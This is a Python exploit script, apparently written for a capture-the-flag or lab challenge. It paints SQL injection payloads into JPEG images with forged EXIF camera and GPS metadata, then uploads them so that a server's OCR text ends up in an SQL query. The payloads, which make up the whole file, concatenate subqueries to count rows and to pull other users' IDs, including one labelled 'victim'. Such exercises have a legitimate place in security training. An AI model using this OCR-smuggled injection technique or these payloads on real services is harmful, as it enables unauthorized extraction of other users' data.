# v2_wide.py — ROOT CAUSE: OCR reorders "FROM images" into "images FROM" when text wraps/spreads,
# breaking SQL (500). Fix: force a SINGLE physical line (very wide canvas, smaller font, no wrap)
# so word order is preserved. Also verify by reading back a plain 'FROM images' stays in order.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=26):
    # VERY wide, single line guaranteed: width scales with text length, height small.
    f=font(size)
    tmp=Image.new("RGB",(10,10)); dd=ImageDraw.Draw(tmp)
    w=dd.textbbox((0,0),text,font=f)[2]
    W=w+120; H=200
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img)
    d.rectangle([0,0,W,90],fill=(255,255,255))
    d.text((20,25),text,font=f,fill=(0,0,0))
    img.save("wd.jpg","jpeg",quality=78,optimize=True)
    def dms(x):
        dd2=int(x);mm=int((x-dd2)*60);s=round((x-dd2-mm/60)*3600,4);return((dd2,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"wd.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("wd.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:16} {r.status_code} ocr={ocr!r}")
    return r.status_code, ocr

q="'"
# 1) verify order preserved on wide single line
up("FROM images ORDER", "order_check")
# 2) table reads, wide single line
up("9"+q+"||(SELECT count(*) FROM images)||"+q+"9", "count")
up("9"+q+"||(SELECT user_id FROM images WHERE id=1)||"+q+"9", "uid_id1")
up("9"+q+"||(SELECT user_id FROM images WHERE user_id<>"+q+UID+q+" LIMIT 1)||"+q+"9", "victim")
up("9"+q+"||(SELECT group_concat(DISTINCT user_id) FROM images)||"+q+"9", "all_uids")
